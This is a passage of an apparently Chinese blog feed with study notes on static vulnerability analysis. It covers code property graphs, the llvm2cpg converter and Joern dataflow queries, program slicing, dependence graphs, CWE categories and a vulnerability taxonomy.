计算得来，通过先判断已定义的变量的集合、每条语句使用到的变量的集合，然后计算每条语句和判断的定义在哪。</p><h2 id="5-转换工具-llvm2cpg">5、转换工具 llvm2cpg</h2><p>llvm2cpg - 将 LLVM bitcode 格式转换成 CPG 图</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ clang -S -emit-llvm -g -O1 main.c -o main.ll </span><br><span class="line">$ llvm2cpg -output=/tmp/cpg.bin.zip main.ll</span><br></pre></td></tr></table></figure><p>下面的 bitcode (IR)内容：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define i32 @sum(i32 %a, i32 %a) &#123;   </span><br><span class="line">    %r = add nsw i32 %a, %b   </span><br><span class="line">    ret i32 %r </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以转换成更高级抽象的形式：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i32 sum(i32 a, i32 b) &#123;   </span><br><span class="line">    i32 r = add(a, b);   </span><br><span class="line">    return r; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="51-实现细节">5.1、实现细节</h2><p>当要用 LLVM 来支持 CPG，首先的问题就是：我们要怎么把 bitcode 映射为 CPG？</p><h3 id="511-指令语义">5.1.1、指令语义</h3><p>我们可以把一些 LLVM 的指令转换成 CPG 的运算符。比如：</p><ul><li><code>add</code>, <code>fadd</code> -&gt; <code>&lt;operator&gt;.addition</code></li><li><code>bitcast</code> -&gt; <code>&lt;operator&gt;.cast</code></li><li><code>fcmp eq</code>, <code>icmp eq</code> -&gt; <code>&lt;operator&gt;.equals</code></li><li><code>urem</code>, <code>srem</code>, <code>frem</code> -&gt; <code>&lt;operator&gt;.modulo</code></li><li><code>getelementptr</code> -&gt; 组合 <code>&lt;operator&gt;.pointerShift</code>, <code>&lt;operator&gt;.indexAccess</code>, 和 <code>&lt;operator&gt;.memberAccess</code> 依赖于 GEP 操作数的类型</li></ul><p>但有一种指令我们无法映射为 CPG 的，那就 phi 指令，在 CPG 中没有 phi 节点的概念，所以我们需要用 reg2mem 的运算方法把 phi 指令去掉。</p><h3 id="512-冗余">5.1.2、冗余</h3><p>Clang 默认会生成大量的冗余指令。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">define</span> <span class="type">i32</span> <span class="title">@sum</span>(<span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span> <span class="variable">%1</span>) &#123;</span><br><span class="line">  <span class="variable">%3</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="variable">%4</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%3</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%1</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%4</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="variable">%5</span> <span class="operator">=</span> <span class="keyword">load</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%3</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="variable">%6</span> <span class="operator">=</span> <span class="keyword">load</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%4</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="variable">%7</span> <span class="operator">=</span> <span class="keyword">add</span> <span class="keyword">nsw</span> <span class="type">i32</span> <span class="variable">%5</span><span class="punctuation">,</span> <span class="variable">%6</span></span><br><span class="line">  <span class="keyword">ret</span> <span class="type">i32</span> <span class="variable">%7</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而不是更加精简的版本：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">define</span> <span class="type">i32</span> <span class="title">@sum</span>(<span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span> <span class="variable">%1</span>) &#123;</span><br><span class="line">  <span class="variable">%3</span> <span class="operator">=</span> <span class="keyword">add</span> <span class="keyword">nsw</span> <span class="type">i32</span> <span class="variable">%1</span><span class="punctuation">,</span> <span class="variable">%0</span></span><br><span class="line">  <span class="keyword">ret</span> <span class="type">i32</span> <span class="variable">%3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般情况下，这不是什么问题，但它增加了数据流追踪的复杂度，而且很没必要地增加了图的大小。一个可以解决的方法是，先对 bitcode 跑一下优化。但最终 LLVM 还是把这种选择权交给用户来决定。</p><h3 id="513-类型等价判断">5.1.3、类型等价判断</h3><p>在我写的一篇译文里有相关更具体的介绍和解决方案《【译】LLVM 类型相等判断》，或者可以直接看**<a href="https://link.zhihu.com/?target=https%3A//lowlevelbits.org/type-equality-in-llvm/">原文</a>**。下面简单地介绍下问题：</p><p>如果有相同结构相同名字的两个模块，被加载到同一上下文，LLVM 会重命名其中一个来避免命名冲突。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; Module1</span></span><br><span class="line"><span class="variable">%struct.Point</span> <span class="operator">=</span> <span class="keyword">type</span> &#123; <span class="type">i32</span><span class="punctuation">,</span> <span class="type">i32</span> &#125;</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; Module 2</span></span><br><span class="line"><span class="variable">%struct.Point</span> <span class="operator">=</span> <span class="keyword">type</span> &#123; <span class="type">i32</span><span class="punctuation">,</span> <span class="type">i32</span> &#125;</span><br></pre></td></tr></table></figure><p>当加载到同一个上下文时：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">%struct.Point</span> <span class="operator">=</span> <span class="keyword">type</span> &#123; <span class="type">i32</span><span class="punctuation">,</span> <span class="type">i32</span> &#125;</span><br><span class="line"><span class="variable">%struct.Point.1</span> <span class="operator">=</span> <span class="keyword">type</span> &#123; <span class="type">i32</span><span class="punctuation">,</span> <span class="type">i32</span> &#125;</span><br></pre></td></tr></table></figure><p>我们需要对这些类型进行去重，以保证最终生成的图中，只会有一个 <code>Point</code> 的节点。这就需要我们判断两个类型是否是等价的。</p><h2 id="52-总结">5.2、总结</h2><p>用 LLVM bitcode 的方式有以下的优点和局限性：</p><ul><li>LLVM 语言的接口比 C 和 C++ 更轻量</li><li>很多抽象层的细节，在 IR 层不会有体现</li><li>程序需要被编译，因此会限制了程序的语言扩展范围</li></ul><h2 id="6-相关产品">6、相关产品</h2><p>现在，CPG 已经被以下几个工具支持了：</p><ul><li><a href="https://link.zhihu.com/?target=https%3A//ocular.shiftleft.io/">Ocular</a>- 支持 Java, Scala, C#, Go, Python, 和 JavaScript 语言</li><li><a href="https://link.zhihu.com/?target=https%3A//joern.io/">Joern</a>- Ocular 的开源部分，支持 C 和 C++</li><li><a href="https://link.zhihu.com/?target=https%3A//plume-oss.github.io/plume-docs/">Plume</a>- 开源工具，支持 Java Bytecode</li></ul><h2 id="61-joern">6.1、Joern</h2><p>Joern 有以下几个重要特性:</p><ul><li><strong>Fuzzy Parsing of C/C++.</strong> 模糊解析，用于在编译环境和部分文件的缺失的情况下，进行解析。</li><li><strong>Code Property Graphs.</strong> 模糊解析的结果会被存储到 CPG 格式的数据库当中。</li><li><strong>Search Queries.</strong> 提供了基于 Gremlin-Scala 扩展的查询语言。</li><li><strong>Extendable via CPG passes.</strong> 支持自定义扩展来添加或消费数据信息。</li></ul><p>Joern 可以为 C/C++ 代码创建以下几种中间表示:</p><ul><li>Abstract Syntax Trees (AST)</li><li>Control Flow Graphs (CFG)</li><li>Control Dependence Graphs (CDG)</li><li>Data Dependence Graphs (DDG)</li><li>Program Dependence graphs (PDG)</li><li>Code Property Graphs (<a href="https://link.zhihu.com/?target=https%3A//www.sec.cs.tu-bs.de/pubs/2014-ieeesp.pdf">CPG14</a>)</li></ul><h2 id="611-joern-使用例子">6.1.1、Joern 使用例子</h2><p>有了 <a href="https://link.zhihu.com/?target=https%3A//docs.joern.io/installation">Joern</a> 和 <a href="https://link.zhihu.com/?target=https%3A//github.com/ShiftLeftSecurity/llvm2cpg/releases/latest">llvm2cpg</a>，就可以愉快地玩耍了：</p><ol><li>转换程序为 LLVM Bitcode</li><li>生成 CPG</li><li>加载 CPG 到 Joern 当中，然后进行分析</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> main.c</span><br><span class="line">extern int MAX;</span><br><span class="line">extern int <span class="built_in">source</span>();</span><br><span class="line">extern void sink(int);</span><br><span class="line">void <span class="function"><span class="title">foo</span></span>() &#123;</span><br><span class="line">  int x = <span class="built_in">source</span>();</span><br><span class="line">  <span class="keyword">if</span> (x &lt; MAX) &#123;</span><br><span class="line">    int y = 2 * x;</span><br><span class="line">    sink(y);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ clang -S -emit-llvm -g -O1 main.c -o main.ll</span><br><span class="line">$ llvm2cpg -output=/tmp/cpg.bin.zip main.ll</span><br></pre></td></tr></table></figure><p>现在我们已经把 CPG 保存到 <code>/tmp/cpg.bin.zip</code> ，之后就能加载到 Joern，然后尝试分析是否有从 <code>source</code> 函数到 <code>sink</code> 函数的流：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ joern</span><br><span class="line">joern&gt; importCpg(<span class="string">&quot;/tmp/cpg.bin.zip&quot;</span>)</span><br><span class="line">joern&gt; run.ossdataflow</span><br><span class="line">joern&gt; def <span class="built_in">source</span> = cpg.call(<span class="string">&quot;source&quot;</span>)</span><br><span class="line">joern&gt; def sink = cpg.call(<span class="string">&quot;sink&quot;</span>).argument</span><br><span class="line">joern&gt; sink.reachableByFlows(<span class="built_in">source</span>).p</span><br><span class="line">List[String] = List(</span><br><span class="line">  <span class="string">&quot;&quot;</span><span class="string">&quot;_____________________________________________________</span></span><br><span class="line"><span class="string">| tracked               | lineNumber| method| file   |</span></span><br><span class="line"><span class="string">|====================================================|</span></span><br><span class="line"><span class="string">| source                | 5         | foo   | main.c |</span></span><br><span class="line"><span class="string">| &lt;operator&gt;.assignment | 5         | foo   | main.c |</span></span><br><span class="line"><span class="string">| &lt;operator&gt;.lessThan   | 6         | foo   | main.c |</span></span><br><span class="line"><span class="string">| &lt;operator&gt;.shiftLeft  | 7         | foo   | main.c |</span></span><br><span class="line"><span class="string">| &lt;operator&gt;.shiftLeft  | 7         | foo   | main.c |</span></span><br><span class="line"><span class="string">| &lt;operator&gt;.assignment | 7         | foo   | main.c |</span></span><br><span class="line"><span class="string">| sink                  | 8         | foo   | main.c |</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="参考">参考</h2><ul><li>论文 《Modeling and Discovering Vulnerabilities with Code Property Graphs》</li><li>LLVM meets Code Property Graphs：<strong><a href="https://link.zhihu.com/?target=https%3A//blog.llvm.org/posts/2021-02-23-llvm-meets-code-property-graphs/">https://blog.llvm.org/posts/2021-02-23-llvm-meets-code-property-graphs/</a></strong></li><li>llvm2cpg：<strong><a href="https://link.zhihu.com/?target=https%3A//github.com/ShiftLeftSecurity/llvm2cpg">https://github.com/ShiftLeftSecurity/llvm2cpg</a></strong></li><li>Joern Documentation：<strong><a href="https://link.zhihu.com/?target=https%3A//docs.joern.io/home/">https://docs.joern.io/home/</a></strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> 理论知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码切片方法</title>
      <link href="/2023/12/18/Security/software%20security/%E7%A8%8B%E5%BA%8F%E5%88%87%E7%89%87/"/>
      <url>/2023/12/18/Security/software%20security/%E7%A8%8B%E5%BA%8F%E5%88%87%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h1 id="程序切片">程序切片</h1><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404252221729.png" alt="image-20231209173102156"></p><p>软件漏洞主要由<strong>指针、数组、表达式运算、敏感 API 函数</strong>所在位置引入, 并称其为漏洞关注点。 如常见的<strong>数组越界、整数溢出、空指针</strong>、API 函数错误使用等类型漏洞, 均由以上 4 类漏洞关注点所致. 在程序代码中, 与漏洞关注点存在数据依赖或者控制依赖关系的语句集合构成一个可能存在漏洞的程序切片;反之, 其他语句被视为会干扰模型训练的漏洞无关语句. 不同于 Li 等人[19]构 造的文本切片, 本文提取程序依赖图的子图作为切片, 即选取上述 4 类漏洞关注点作为程序切片的基准点后, 保留与其存在数据及控制依赖关系的节点和边, 以生成程序依赖图子图. 具体来说, 生成代码切片可以分为 3 个步骤.</p><p>（1）漏洞关注点选取，通过遍历程序依赖图节点，选取符合4类漏洞关注点的代码元素，并记录节点作为切片基点；</p><p>具体地，</p><p>通过在标识符声明节点中匹配“[”字符来确定数组元素；</p><p>通过在标识符声明节点中匹配“*”字符来确定指针元素；</p><p>通过正则表达式规则来匹配表达式运算节点；</p><p>通过Li 等人[19]提供的敏感 API 列表进行敏感 API 节点匹配；</p><p>如图 2 中程序依赖图提取部分所示, 1 号节点存 在指针元素 VAR1, 2 号和 5 号节点分别存在数组元素 VAR2 和 VAR3, 6 号节点存在敏感 API 元素strncat. 因此, 以上节点被选定为程序切片的基准点;</p><p>（2）程序切片生成. 从切片基准点出发, 分别执行前向及后向切片以生成程序切片. 具体而言, 在程序 依赖图上, 以漏洞关注点所在节点为起点, 分别追溯前向、后向的控制依赖边和数据依赖边, 并记 录涉及到的节点和边, 直到不再出现新增节点和边为止. 根据上述步骤得到的程序依赖图子图即为 一个程序切片. 因其只包含与漏洞关注点具有依赖关系的节点和边, 故在保留源代码结构信息的同 时, 排除了图中漏洞无关的信息. 图 2 中代码切片提取部分展示了从该源代码的程序依赖图中提取 的部分切片, 切片 1-切片 4 分别为以 VAR1、VAR2、VAR3 和 strncat 为切片基准点获得的切片;</p><p>（3）程序切片标注. 本文依赖漏洞的补丁信息对切片进行标注, 即: 包含该漏洞补丁中删减行的切片被 标注为有漏洞切片, 反之被认为是无漏洞切片. 根据其提供的漏洞信息, 漏洞补丁的删减行为源代 码的第 11 行, 即对应程序依赖图中的 6 号节点. 根据标注规则, 由于图 2 的切片 1-切片 4 均包含 6 号节点, 因此均被标注为有漏洞切片.</p><p>程序依赖图子图包含两个维度的特征, 即节点内的代码特征(下文简称为节点特征)和图结构特征.</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> 理论知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序依赖图与可达性</title>
      <link href="/2023/12/18/Security/software%20security/%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E4%B8%8E%E5%8F%AF%E8%BE%BE%E6%80%A7/"/>
      <url>/2023/12/18/Security/software%20security/%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E4%B8%8E%E5%8F%AF%E8%BE%BE%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/weixin_44121966/article/details/120191585">【程序分析】数据依赖、控制依赖、程序依赖图PDG、系统依赖图SDG-CSDN博客</a></p><h2 id="可达性">可达性</h2><p>变量v的定义：对变量v的赋值语句成为变量的定义；</p><p>变量v的使用：在某个表达式中引用变量v的值；</p><p>当变量v被再次赋值时，上一次赋值对变量v的定义d就被kill掉了；</p><p>如果定义d到点p之间存在一条路径，且在路径中定义d没有被kill掉，则称d可以达到p</p><p>如下图所示，d可以通过path2到达u但是不能通过path1到达u，因为k这条语句kill掉了定义d。而因为d到u之间存在着没有被kill的路径path2，所以d可以到达u。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403282151811.jpeg" alt="img"></p><p>X = . 叫做精确定义，*p = . 叫做模糊定义，因为p可能指向X，一般考虑可达性只考虑精确定义对路径的kill。</p><h3 id="数据依赖">数据依赖</h3><p>两个句子存在数据依赖：一条语句中一个变量的定义，可以<strong>到达</strong>另一条语句中对该变量的使用。</p><p>在编译领域有不同类型的数据依赖，如果我们说s2依赖于s1，可以是：</p><ol><li>s1 写内存 s2 读 (RAW)</li><li>s1 读内存 s2 写 (WAR)</li><li>s1 写内存 s2 写 (WAW)</li><li>s1 读内存 s2 读 (RAR)</li></ol><p>在软件工程领域，主要关注RAW依赖，在源码或IR的层度上。</p><p>DU-chains: def-use chains 优点是可以快速得到数据依赖，缺点是必须不断计算和更新，空间开销大。<strong>将每个语句作为结点，箭头作为有向边，即可得到数据依赖图。</strong></p><p>SSA：static single assignment 每一次赋值都由一个不同的变量表示，优点是使得分析变得简单高效，缺点是需要添加额外的条件才能正确执行，时空开销大。</p><h3 id="pdg程序依赖图">PDG：程序依赖图</h3><p>程序依赖图的结点代表语句，边代表依赖关系，这里的依赖关系包括数据依赖和控制依赖</p><p>数据依赖：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s1: A = B * C;</span><br><span class="line">s2: D = A * E + 1</span><br><span class="line">由于s1语句变量A在s2语句中被读，因此称s2数据依赖于s1</span><br></pre></td></tr></table></figure><p>控制依赖：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s1: if (A) then</span><br><span class="line">s2:  B = C * D</span><br><span class="line">    endif</span><br><span class="line">由于s1语句变量A的值决定了s2语句是否被执行，因此称s2控制依赖于s1</span><br></pre></td></tr></table></figure><p>其中<strong>控制依赖用实箭头表示，数据依赖用虚箭头表示</strong>。构建PDG图的整体流程如下。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403282158018.jpeg" alt="img"></p><p>首先得到控制流图，从中找到控制依赖图和数据依赖图，结合起来即得到PDG图。控制依赖图由控制流图和FDT（Forward Dominance Tree， 前向支配树）产出。</p><p>FDT概念源于：<strong>如果每一条从流图的入口结点到结点n的路径都经过结点d, 我们就说d支配（dominate）n，记为d dom n。</strong></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403282205184.png" alt="image-20240328220508138"></p><p>在支配树（dominator tree）中，对于结点n来说，从根节点到结点n所在路径上的结点都严格支配结点n，例如上图中从根节点1 -&gt; 2 -&gt; 3，其中结点1和结点2都严格支配结点3。该路径上离结点n最近的结点叫做结点n的直接支配结点（immediate node），用IDom(n)表示，例如上图中IDom(6) = 2。</p><p>前向支配树（FDT）指的就是根节点为函数出口的支配树，也就是上图的翻转，如下图所示，右侧为左侧函数对应的FDT(比如5-&gt;2的箭头表示，所有从函数出口到2的路径都一定会经过5，因此5是2的主导)：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290837612.jpeg" alt="img"></p><ol><li><strong>Forward Dominance Tree (FDT)</strong>: 前向支配树是一种基于支配概念的数据结构，它在每个节点上维护了一组在程序执行过程中可能到达该节点的支配节点集合。在FDT中，一个节点A支配另一个节点B，如果从程序的入口点到B的每个路径都包含A。FDT通常用于分析程序的执行顺序，特别是在考虑循环和分支结构时。它可以用于执行前向数据流分析，如可达性分析和可用性分析。</li><li><strong>Post Dominance Tree</strong>: 后支配树是另一种基于支配关系的数据结构，但它关注的是从每个节点出发直到程序结束的路径。在后支配树中，**一个节点A后支配另一个节点B，如果所有从B出发的路径最终都会到达A。**后支配树通常用于执行后向数据流分析，如死代码消除和可达性分析。</li></ol><p>于是，得到FDT后将其与控制流图结合即可得到控制依赖图如下，有了控制依赖图，加上之前的数据依赖图，集合起来就得到了程序依赖图PDG。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290907658.jpeg" alt="img"></p><p>作者：Hero<br>链接：<a href="https://zhuanlan.zhihu.com/p/324696483">https://zhuanlan.zhihu.com/p/324696483</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><h3 id="sdg系统依赖图">SDG：系统依赖图</h3><p>系统依赖图，顾名思义，在PDG的基础上增加了一些点和边将整个系统整合在一起表示，对于系统中主函数的依赖图称为program dependence graph，对于其余函数称为procedure dependence graphs。</p><p>SDG中增加了5类新的结点：</p><ol><li><p>调用点</p></li><li><p>actual-in结点：它是具有与调用点相关的控制依赖，将实参的值传入一个临时单元中(例如x_in)</p></li></ol><ol start="3"><li>actual-out结点：也是具有与调用点相关的控制依赖，将临时单元中的值返回给实参</li><li>formal-in结点：它是具有与被调函数入口相关的控制依赖，将临时单元中的值复制给形参</li><li>formal-out结点：也是具有与被调函数入口相关的控制依赖，将形参中的值返回给临时单元</li></ol><p>SDG中增加了3类新的边：1）从调用点指向被调函数入口结点的边  2）parameter-in边：actual-in结点指向formal-in结点的边(相当于实参-&gt;临时单元-&gt;形参)  3）parameter-out边: formal-out结点指向actual-out结点的边(相当于上述过程的返回过程)</p><p>一个SDG图的例子如下：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290907129.jpeg" alt="img"></p><p>生成SDG的步骤：</p><p>1）首先先生成主函数的program dependence graph，和所有被调函数的procedure dependence graphs</p><p>2）对于每一个调用点，添加一条边指向被调函数的入口点</p><p>3）对于在调用点处的每一个actual-in的结点，添加一条parameter-in的边，指向被调函数对应的formal-in的结点</p><p>4）对于在调用点处的每一个actual-out的结点，添加一条parameter-out的边，由被调函数对应的formal-out的结点所指向</p><h3 id="参考文献">参考文献：</h3><p>[1] Ferrante J, Ottenstein K J, Warren J D. The program dependence graph and its use in optimization[J]. ACM Transactions on Programming Languages and Systems (TOPLAS), 1987, 9(3): 319-349.</p><p>[2] Sinha S, Harrold M J, Rothermel G. System-dependence-graph-based slicing of programs with arbitrary interprocedural control flow[C]//Proceedings of the 1999 International Conference on Software Engineering (IEEE Cat. No. 99CB37002). IEEE, 1999: 432-441.</p><p>[3] Tip F. A survey of program slicing techniques[M]. Amsterdam: Centrum voor Wiskunde en Informatica, 1994.</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> 理论知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CWE描述</title>
      <link href="/2023/12/18/Security/software%20security/CWE/"/>
      <url>/2023/12/18/Security/software%20security/CWE/</url>
      
        <content type="html"><![CDATA[<p>CWE119.内存缓冲区边界内操作限制不当：这类漏洞包括对内存缓冲区的操作，但它可以从缓冲区边界外的内存位置读取或写入。此漏洞类别会导致系统崩溃或泄露敏感信息。</p><p>CWE20.输入验证不正确：这类漏洞包括接收输入或数据但未验证或验证不正确的功能。如果输入或数据没有得到验证，软件将接收到意外的输入，这将导致控制流的更改或任意代码的执行。</p><p>CWE399.资源管理错误：这类漏洞可能是由软件执行过程中对系统资源（如内存和文件）的不当管理造成的。</p><p>CWE264.权限、特权和访问控制：这种类型的漏洞与不正确的访问控制有关，例如权限、权限和其他安全功能的管理。</p><p>CWE416.释放后使用：属于此类型的漏洞将引用以前释放的内存，这可能导致有效数据损坏或执行任意代码。</p><p>CWE125.越界读取：这类漏洞会导致读取过多的数据，从而导致分段故障或缓冲区溢出。</p><p>CWE189.数字错误：此类型的漏洞与不正确的数字计算或转换有关，例如数字类型之间的不正确转换以及使用不正确的运算符进行浮点比较。</p><p>CWE362.使用同步不正确的共享资源并发执行：这类漏洞包含可以与其他代码并发运行的代码片段，并且该代码需要对共享资源的临时独占访问。共享资源可以由同时运行的另一个代码进行修改。</p><p>CWE476.NULL指针取消引用：当应用程序取消引用一个预期有效但为NULL的指针时，这种类型的漏洞会导致崩溃或退出。</p><p>CWE190.整数溢出或环绕：当整数值增加到大于原始值的值时，这种类型的漏洞会产生整数溢出或环绕。当该值用于进行安全决策或控制循环时，源代码将成为安全关键代码。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnerabiliity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件漏洞分类</title>
      <link href="/2023/12/18/Security/software%20security/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB/"/>
      <url>/2023/12/18/Security/software%20security/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="软件漏洞分类">软件漏洞分类</h1><ul><li>输入验证错误（Input Validation Error, IVE）<ul><li>边界条件错误（Boundary condition error,BCE）<ul><li>边界条件错误是指未能对用户输入数据的合法性进行有效检查导致输入到程序中的值无效。例如输入的数字大于或小于某个阈值，或者文本输入中的字符长度过长等，都会发生边界条件错误。</li></ul></li><li>缓冲区溢出（Buffer overflow, BOF）<ul><li>缓冲区溢出是指当数据量超过内存缓冲区的存储容量时，超出的数据会覆盖相邻的存储区域，造成程序正常堆栈的破坏，从而影响其他程序的正常运行。</li></ul></li></ul></li><li>访问验证错误（Access Validation Error, AVE）<ul><li>这类漏洞的形成原因是由于程序的访问验证部分存在某些逻辑错误，使攻击者可以绕过访问控制进入系统。例如，一个对象的调用或其他操作在其访问域之外、一个对象接收了另一个未授权对象的输入、系统没有正确地进行授权操作等都会导致访问校验错误。</li></ul></li><li>异常条件错误处理（Exceptional Condition Error Handling, ECHE）<ul><li>这类漏洞是由于未能响应意外数据或条件而产生的。例如，由于程序在设计实现过程中考虑不周，未包含意外处理的功能模块，当遇到未知的程序输入时程序发生的错误。</li></ul></li><li>环境错误（Environmental Error, EE）<ul><li>这类漏洞是由计算机环境的特定条件触发的。例如，由于错误设置某些环境变量而导致的特权程序执行攻击代码的现象。</li></ul></li><li>配置错误（Configuration Error, CE）<ul><li>这类漏洞是由于不正确的系统设置引起的。例如，参数配置错误、访问权限设置错误、系统安装位置错误等。</li></ul></li><li>竞争条件错误（Race Condition Error, RC）<ul><li>这类漏洞是由于程序执行的实体在时序和同步方面出现问题导致的。</li></ul></li><li>设计错误（Design Error, DE）<ul><li>这类漏洞是由于软件结构设计不当引起的。严格来说，大部分漏洞产生的原因都是因为设计错误。</li></ul></li><li>其他类型<ul><li>不属于上述类型的漏洞类型，有时也被称为非标准错误。</li></ul></li><li>漏洞严重程度分类<ul><li>通用漏洞评估系统[40]（Common Vulnerability Scoring System, CVSS）是一个用于评估软件漏洞严重程度的开放框架，CVSS 尝试为漏洞分配一个代表严重程度的评分，从而使得响应者可以根据危险等级对响应和资源进行优先级排序。评分的度量由三个评估指标组成，分别是基本评估指标、时间评估指标和环境评估指标。基本评估指标产生的分数介于 0 到 10 之间，然后可以通过时间评估指标和环境评估指标对其进行修正，CVSS 的评分越高表明漏洞的严重程度越高，反之严重程度越低。最新的 CVSS 3.1 